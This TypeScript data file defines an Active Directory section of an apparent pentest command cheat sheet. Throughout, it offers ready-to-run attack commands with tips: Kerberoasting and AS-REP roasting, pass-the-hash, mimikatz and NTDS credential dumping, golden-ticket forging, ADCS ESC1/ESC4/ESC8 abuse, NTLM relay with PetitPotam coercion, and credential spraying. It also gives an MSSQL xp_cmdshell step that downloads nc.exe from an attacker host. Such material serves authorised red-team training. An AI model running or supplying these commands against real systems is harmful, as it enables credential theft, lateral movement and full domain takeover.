import { Section } from "./types";

export const adSection: Section = {
  id: "ad",
  title: "Active Directory",
  slug: "ad",
  groups: [
    {
      title: "AD Enumeration",
      subtitle: "Run as the first step after gaining any domain user credentials — BloodHound for full attack paths, PowerView for fast lookups.",
      commands: [
        { id: "ad-1", cmd: "bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {DC} -c all", description: "Full BloodHound collection — run from attacker with domain credentials to map all AD attack paths.", tip: "After ingest, run 'Shortest Paths to Domain Admins' in BloodHound to see the fastest route.", tags: ["ad"], hasVars: true },
        { id: "ad-1a", cmd: "bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {DC} -c dconly", description: "Faster DC-only collection — skips workstations. Use when full scan is too noisy or slow.", tags: ["ad"], hasVars: true },
        { id: "ad-1b", cmd: "SharpHound.exe -c All --zipfilename sh.zip", description: "Windows in-domain collector — run from a domain-joined host. Quieter than running bloodhound-python from Kali.", tip: "If AV flags it, use the .ps1 variant: powershell -ep bypass -c \". .\\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All\"", tags: ["ad", "windows"] },
        { id: "ad-pv-1", cmd: "powershell -ep bypass -c \". .\\PowerView.ps1; Get-NetDomain\"", description: "PowerView load + basic domain info — the fastest way to confirm forest/domain layout without BloodHound overhead.", tip: "Load once per session: `. .\\PowerView.ps1` (note the dot-space). All subsequent Get-Net* / Find-* cmdlets are then available.", tags: ["ad", "windows"] },
        { id: "ad-pv-2", cmd: "Get-NetUser | select samaccountname,description,memberof", description: "List all domain users with descriptions — descriptions occasionally contain passwords or context hints.", tip: "Pipe to: ? { $_.description } to filter only users with non-empty descriptions.", tags: ["ad", "windows"] },
        { id: "ad-pv-3", cmd: "Get-NetGroup | select samaccountname,description", description: "List all domain groups — look for custom groups like 'IT Admins', 'Server Operators', or 'VPN Users'.", tags: ["ad", "windows"] },
        { id: "ad-pv-4", cmd: "Get-NetGroupMember -GroupName 'Domain Admins'", description: "Who is a Domain Admin? — primary lateral-movement target list.", tags: ["ad", "windows"] },
        { id: "ad-pv-5", cmd: "Find-DomainUserLocation", description: "Find machines where Domain Admin users are currently logged in — primary credential-harvest targets.", tip: "Was formerly Invoke-UserHunter. Critical for planning lateral movement before BloodHound finishes.", tags: ["ad", "windows"] },
        { id: "ad-pv-6", cmd: "Get-NetComputer -OperatingSystem '*Server*' | select dnshostname,operatingsystem", description: "List all Windows Servers in the domain — identify the DC and member servers without DNS round-trips.", tags: ["ad", "windows"] },
        { id: "ad-pv-7", cmd: "Get-DomainUser -SPN | select samaccountname,serviceprincipalname", description: "Find kerberoastable accounts via SPN attribute — feeds directly into Kerberoasting.", tags: ["ad", "windows"] },
        { id: "ad-pv-8", cmd: "Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match 'YourUser' }", description: "Find ACL edges (GenericWrite / WriteDACL / GenericAll) that your user has — same paths as BloodHound's ACL queries.", tags: ["ad", "windows"] },
      ],
    },
    {
      title: "ASREPRoasting",
      subtitle: "Use when you have a list of domain usernames — targets accounts with pre-auth disabled for offline cracking.",
      commands: [
        { id: "ad-2", cmd: "GetNPUsers.py {DOMAIN}/ -dc-ip {DC} -usersfile users.txt -format hashcat -outputfile asrep.txt", description: "Request AS-REP hashes for users without Kerberos pre-auth — no password required.", tip: "Crack with: hashcat -m 18200 asrep.txt rockyou.txt. Common on service accounts.", tags: ["ad"], hasVars: true },
        { id: "ad-2a", cmd: "GetNPUsers.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request -format hashcat", description: "AS-REP roast with credentials — requests hashes for all pre-auth-disabled accounts automatically.", tags: ["ad"], hasVars: true },
      ],
    },
    {
      title: "Kerberoasting",
      subtitle: "Use any domain user credentials — requests service tickets for accounts with SPNs for offline cracking.",
      commands: [
        { id: "ad-3", cmd: "GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request", description: "Request TGS tickets for all SPN accounts — outputs hashcat-ready hashes.", tip: "Crack with: hashcat -m 13100 tgs.hashes rockyou.txt. Service accounts often have weak passwords.", tags: ["ad"], hasVars: true },
        { id: "ad-3a", cmd: "GetUserSPNs.py -request -dc-ip {DC} {DOMAIN}/{USER}:{PASS} -outputfile tgs.hashes", description: "Save TGS hashes to file — use when there are multiple accounts to crack offline.", tags: ["ad"], hasVars: true },
      ],
    },
    {
      title: "Pass-the-Hash",
      subtitle: "Use when you have an NTLM hash but no plaintext password — authenticate without cracking.",
      commands: [
        { id: "ad-4", cmd: "impacket-psexec -hashes {HASH} {DOMAIN}/{USER}@{RHOST}", description: "Execute commands as the hash owner via SMB — spawns SYSTEM shell if user is local admin.", tip: "Hash format: LM:NT (use 'aad3b435b51404eeaad3b435b51404ee' as LM placeholder if unknown)", tags: ["ad"], hasVars: true },
        { id: "ad-4a", cmd: "impacket-wmiexec -hashes {HASH} {DOMAIN}/{USER}@{RHOST}", description: "WMI-based exec with hash — less noisy than psexec, doesn't drop a service binary.", tags: ["ad"], hasVars: true },
        { id: "ad-4b", cmd: "crackmapexec smb {RHOST} -u {USER} -H {HASH}", description: "Validate a hash against a target — confirms if the account has local admin access.", tip: "Spray across a subnet: crackmapexec smb 10.10.10.0/24 -u {USER} -H {HASH}", tags: ["ad"], hasVars: true },
      ],
    },
    {
      title: "Credential Dumping",
      subtitle: "Use after gaining DC admin or local admin — dump domain hashes for full domain compromise.",
      commands: [
        { id: "ad-5", cmd: "secretsdump.py {DOMAIN}/{USER}:{PASS}@{DC}", description: "Dump all NTDS.dit hashes from the DC — requires domain admin. Provides every user's NTLM hash.", tip: "After dumping, use administrator hash for PtH: impacket-psexec -hashes {HASH} {DOMAIN}/administrator@{DC}", tags: ["ad"], hasVars: true },
        { id: "ad-5a", cmd: "mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", description: "Dump credentials from LSASS on a domain-joined machine — may capture DA tickets or plaintext passwords.", tip: "Run on a DC or machine where domain admins have recently logged in.", tags: ["ad", "windows"] },
      ],
    },
    {
      title: "Golden/Silver Tickets",
      subtitle: "Use after obtaining the krbtgt hash — forge tickets to impersonate any user with no time limit.",
      commands: [
        { id: "ad-6", cmd: "ticketer.py -nthash {HASH} -domain-sid {SID} -domain {DOMAIN} administrator", description: "Forge a golden ticket as Administrator — requires krbtgt NTLM hash and domain SID.", tip: "Get domain SID: lookupsid.py {DOMAIN}/{USER}:{PASS}@{DC} | grep 'Domain SID'", tags: ["ad"], hasVars: true },
        { id: "ad-6a", cmd: "export KRB5CCNAME=administrator.ccache", description: "Load forged ticket into environment — then use with impacket tools or evil-winrm -k.", tags: ["ad"] },
      ],
    },
    {
      title: "ADCS Abuse",
      subtitle: "Use when AD Certificate Services is deployed — ESC1/ESC4/ESC8 misconfigs lead directly to DA.",
      commands: [
        { id: "ad-7", cmd: "certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -vulnerable", description: "Enumerate ADCS templates and flag vulnerable ones — ESC1/4/8 are the most commonly exploitable.", tip: "ESC1 is simplest: any low-priv user can request a cert with a DA UPN. Check output carefully.", tags: ["ad"], hasVars: true },
        { id: "ad-7a", cmd: "certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {DC} -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN}", description: "ESC1 — request a certificate impersonating Administrator. Template must allow enrollee-supplied SAN.", tip: "Get {CA_NAME} and {TEMPLATE} from 'certipy find' output. Flag: ENROLLEE_SUPPLIES_SUBJECT.", tags: ["ad"], hasVars: true },
        { id: "ad-7b", cmd: "certipy auth -pfx administrator.pfx -dc-ip {DC}", description: "Authenticate using the forged certificate — gets the administrator's NTLM hash via PKINIT.", tip: "Outputs NTLM hash — use immediately for PtH: impacket-psexec -hashes {HASH} domain/administrator@{DC}", tags: ["ad"], hasVars: true },
        { id: "ad-7c", cmd: "certipy template -u {USER}@{DOMAIN} -p {PASS} -template {TEMPLATE} -save-old", description: "ESC4 — save current template config before modifying it. Restores the template after exploitation.", tip: "ESC4 requires Write permissions on the template object — check BloodHound for WriteProperty on CA templates.", tags: ["ad"], hasVars: true },
        { id: "ad-7d", cmd: "certipy template -u {USER}@{DOMAIN} -p {PASS} -template {TEMPLATE} -configuration {TEMPLATE}.json", description: "ESC4 — write the modified template config to make it ESC1-exploitable, then request a cert as DA.", tags: ["ad"], hasVars: true },
        { id: "ad-7e", cmd: "ntlmrelayx.py -t http://{DC}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController", description: "ESC8 — relay NTLM auth to the ADCS HTTP enrollment endpoint to get a certificate as the relayed account.", tip: "Trigger with: responder -I eth0 -A (passive) then wait for any auth, or coerce with printerbug/PetitPotam.", tags: ["ad"], hasVars: true },
        { id: "ad-7f", cmd: "certipy auth -pfx dc.pfx -dc-ip {DC} -username {DC_HOSTNAME}$ -domain {DOMAIN}", description: "ESC8 — authenticate as the DC machine account using the relayed certificate to get DC's NTLM hash.", tip: "DC hash → secretsdump -just-dc: full domain dump without touching LSASS on the DC.", tags: ["ad"], hasVars: true },
      ],
    },
    {
      title: "Shadow Credentials",
      subtitle: "Use when you have WriteProperty/GenericWrite on a user or computer object — no cert template needed.",
      commands: [
        { id: "ad-sc-1", cmd: "pywhisker.py -d {DOMAIN} -u {USER} -p {PASS} --dc-ip {DC} --target {TARGET_USER} --action add", description: "Add a shadow credential (KeyCredential) to a target account — no cert template required.", tip: "Requires GenericWrite or WriteProperty (msDS-KeyCredentialLink) on the target account.", tags: ["ad"], hasVars: true },
        { id: "ad-sc-2", cmd: "pywhisker.py -d {DOMAIN} -u {USER} -p {PASS} --dc-ip {DC} --target {TARGET_USER} --action list", description: "List existing KeyCredentials on a target account — check before adding to avoid breaking the account.", tags: ["ad"], hasVars: true },
        { id: "ad-sc-3", cmd: "gettgtpkinit.py -cert-pfx {TARGET_USER}.pfx -pfx-pass {PASS} {DOMAIN}/{TARGET_USER} {TARGET_USER}.ccache", description: "Use the shadow credential PFX to get a TGT for the target user via PKINIT.", tip: "Outputs a .ccache file. Export KRB5CCNAME then use with secretsdump or evil-winrm -k.", tags: ["ad"], hasVars: true },
        { id: "ad-sc-4", cmd: "getnthash.py -key {AS_REP_KEY} {DOMAIN}/{TARGET_USER}", description: "Extract the NTLM hash from the AS-REP encryption key — use for pass-the-hash after PKINIT.", tags: ["ad"], hasVars: true },
      ],
    },
    {
      title: "NTLM Relay",
      subtitle: "Use when SMB signing is disabled on targets — relay captured NTLM auth to SMB/LDAP/ADCS for access.",
      commands: [
        { id: "ad-relay-1", cmd: "nmap --script smb2-security-mode -p 445 {RHOST}/24 2>/dev/null | grep -B 5 'not required'", description: "Find hosts with SMB signing not required — these are vulnerable to NTLM relay attacks.", tags: ["ad"], hasVars: true },
        { id: "ad-relay-2", cmd: "ntlmrelayx.py -tf targets.txt -smb2support", description: "Relay captured SMB auth to a list of targets — dumps SAM hashes on successful relay.", tip: "Combine with: responder -I eth0 --lm (disable SMB/HTTP in Responder.conf first).", tags: ["ad"] },
        { id: "ad-relay-3", cmd: "ntlmrelayx.py -tf targets.txt -smb2support -i", description: "Interactive relay — opens a SOCKS listener when auth is relayed, giving an interactive SMB shell.", tip: "Connect with: smbclient -U '' //127.0.0.1/C$ after ntlmrelayx opens the port.", tags: ["ad"] },
        { id: "ad-relay-4", cmd: "ntlmrelayx.py -t ldap://{DC} --delegate-access --escalate-user {USER}", description: "Relay to LDAP to grant Resource-Based Constrained Delegation — then impersonate any user via S4U2Self.", tip: "Use when machine accounts can be created and LDAP signing is not enforced.", tags: ["ad"], hasVars: true },
        { id: "ad-relay-5", cmd: "PetitPotam.py {LHOST} {DC}", description: "Coerce DC NTLM authentication to your machine — use to trigger relay attacks targeting the DC.", tip: "Pair with ntlmrelayx -t http://{DC}/certsrv for ESC8, or -t ldap://{DC} for delegation abuse.", tags: ["ad"], hasVars: true },
      ],
    },
    {
      title: "NetExec / nxc",
      subtitle: "Drop-in CrackMapExec replacement — use nxc for SMB/WinRM/MSSQL/LDAP enumeration and credential spray.",
      commands: [
        { id: "nxc-1", cmd: "nxc smb {RHOST}/24 -u {USER} -p {PASS}", description: "Spray credentials across a subnet — marks Pwn3d! if the account has local admin access.", tip: "Also try -H {HASH} for pass-the-hash spray across the entire subnet.", tags: ["ad", "windows"], hasVars: true },
        { id: "nxc-2", cmd: "nxc smb {RHOST} -u {USER} -p {PASS} --shares", description: "List accessible SMB shares with read/write permissions — find loot, writable paths, and staging dirs.", tags: ["ad", "windows"], hasVars: true },
        { id: "nxc-3", cmd: "nxc smb {RHOST} -u {USER} -p {PASS} --sam", description: "Dump the SAM database — works with local admin. Provides local account NTLM hashes.", tip: "Use --lsa to dump LSA secrets, or --ntds for NTDS on a DC.", tags: ["ad", "windows"], hasVars: true },
        { id: "nxc-4", cmd: "nxc smb {RHOST} -u {USER} -p {PASS} -x 'whoami'", description: "Run a command via SMB (wmiexec method) — confirms RCE and validates admin access.", tags: ["ad", "windows"], hasVars: true },
        { id: "nxc-5", cmd: "nxc winrm {RHOST} -u {USER} -p {PASS}", description: "Test WinRM access — confirms port 5985 reachability and credentials for evil-winrm.", tags: ["ad", "windows"], hasVars: true },
        { id: "nxc-6", cmd: "nxc mssql {RHOST} -u {USER} -p {PASS} -q 'SELECT @@version'", description: "Query MSSQL version — confirms credentials and access level. Starting point for MSSQL exploitation.", tags: ["ad", "windows"], hasVars: true },
        { id: "nxc-7", cmd: "nxc smb {RHOST} -u '' -p '' --shares", description: "NULL session SMB enumeration — check for anonymous access before using credentials.", tip: "Also try: nxc smb {RHOST} -u 'guest' -p '' --shares for guest access.", tags: ["ad", "windows"], hasVars: true },
        { id: "nxc-8", cmd: "nxc ldap {DC} -u {USER} -p {PASS} --users", description: "Enumerate domain users via LDAP — faster than bloodhound for quick user list extraction.", tags: ["ad"], hasVars: true },
        { id: "nxc-9", cmd: "nxc smb {RHOST} -u users.txt -p passwords.txt --no-bruteforce --continue-on-success", description: "Spray a user:pass list without brute force — one password per user to avoid lockouts.", tip: "--no-bruteforce pairs each user with one password. Remove flag to try all combinations.", tags: ["ad", "windows"], hasVars: true },
      ],
    },
    {
      title: "MSSQL Attacks",
      subtitle: "Use when MSSQL (port 1433) is found — xp_cmdshell, impersonation, and linked servers all lead to RCE.",
      commands: [
        { id: "mssql-1", cmd: "impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{RHOST} -windows-auth", description: "Connect to MSSQL with Windows auth — use when the account has SQL login permissions.", tip: "Try without -windows-auth for SQL auth. Common on OSCP: sa account with blank/simple password.", tags: ["ad", "windows"], hasVars: true },
        { id: "mssql-2", cmd: "SELECT name FROM master..sysdatabases", description: "List all databases — run after connecting to MSSQL to find interesting targets.", tags: ["ad", "windows"] },
        { id: "mssql-3", cmd: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", description: "Enable xp_cmdshell for OS command execution — requires sysadmin role.", tip: "If denied, check impersonation: SELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", tags: ["ad", "windows"] },
        { id: "mssql-4", cmd: "EXEC xp_cmdshell 'whoami'", description: "Run OS command via xp_cmdshell — output appears as query result rows.", tip: "Upload a shell: xp_cmdshell 'certutil -urlcache -f http://{LHOST}/nc.exe C:\\Windows\\Temp\\nc.exe'", tags: ["ad", "windows"] },
        { id: "mssql-5", cmd: "EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'", description: "Impersonate a higher-privilege SQL login — use when your login has IMPERSONATE permission on sa.", tip: "Check impersonatable logins before enabling xp_cmdshell under your own account.", tags: ["ad", "windows"] },
        { id: "mssql-6", cmd: "SELECT * FROM sys.servers; EXEC ('SELECT @@version') AT [{LINKED_SERVER}]", description: "Enumerate linked servers and execute queries on them — linked servers often have higher privileges.", tip: "Double-hop: EXEC ('EXEC (''xp_cmdshell ''''whoami'''';'') AT [TARGET2]') AT [TARGET1]", tags: ["ad", "windows"], hasVars: true },
        { id: "mssql-7", cmd: "EXEC xp_dirtree '\\\\{LHOST}\\share', 1, 1", description: "Trigger UNC path authentication — captures the MSSQL service account's NTLM hash via Responder.", tip: "Run before: responder -I eth0 -v. The hash can be cracked or relayed.", tags: ["ad", "windows"], hasVars: true },
      ],
    },
    {
      title: "Delegation Abuse",
      subtitle: "Use when BloodHound shows Constrained or Unconstrained delegation — allows service ticket impersonation.",
      commands: [
        { id: "ad-8", cmd: "findDelegation.py {DOMAIN}/{USER}:{PASS} -dc-ip {DC}", description: "Enumerate all delegation configurations — finds constrained, unconstrained, and resource-based delegation.", tags: ["ad"], hasVars: true },
        { id: "ad-8a", cmd: "getST.py -spn cifs/{RHOST}.{DOMAIN} -impersonate administrator {DOMAIN}/{USER}:{PASS} -dc-ip {DC}", description: "Constrained delegation abuse — request a service ticket impersonating Administrator for the target service.", tip: "Requires the service account to have AllowedToDelegateTo set on the target SPN.", tags: ["ad"], hasVars: true },
        { id: "ad-8b", cmd: "export KRB5CCNAME=administrator.ccache && smbclient -k //{RHOST}/c$", description: "Use delegated ticket to access SMB share as Administrator — no password needed.", tags: ["ad"], hasVars: true },
      ],
    },
    {
      title: "Lateral Movement",
      subtitle: "Use valid credentials or hashes to move between hosts — evil-winrm is the most versatile option.",
      commands: [
        { id: "ad-9", cmd: "evil-winrm -i {RHOST} -u {USER} -p {PASS}", description: "WinRM shell with credentials — best interactive shell for Windows. Works on port 5985/5986.", tip: "Use -H for hash instead of -p for pass-the-hash. Add -S for HTTPS (5986).", tags: ["ad", "windows"], hasVars: true },
        { id: "ad-9a", cmd: "impacket-smbexec {DOMAIN}/{USER}:{PASS}@{RHOST}", description: "Remote command execution over SMB — doesn't drop a binary, uses a temporary service instead.", tags: ["ad"], hasVars: true },
        { id: "ad-9b", cmd: "wmiexec.py {DOMAIN}/{USER}:{PASS}@{RHOST}", description: "WMI remote exec — semi-interactive shell over DCOM. Quieter than psexec, no service creation.", tip: "Prefer wmiexec over psexec to avoid AV/EDR detection from service creation.", tags: ["ad"], hasVars: true },
      ],
    },
  ],
};
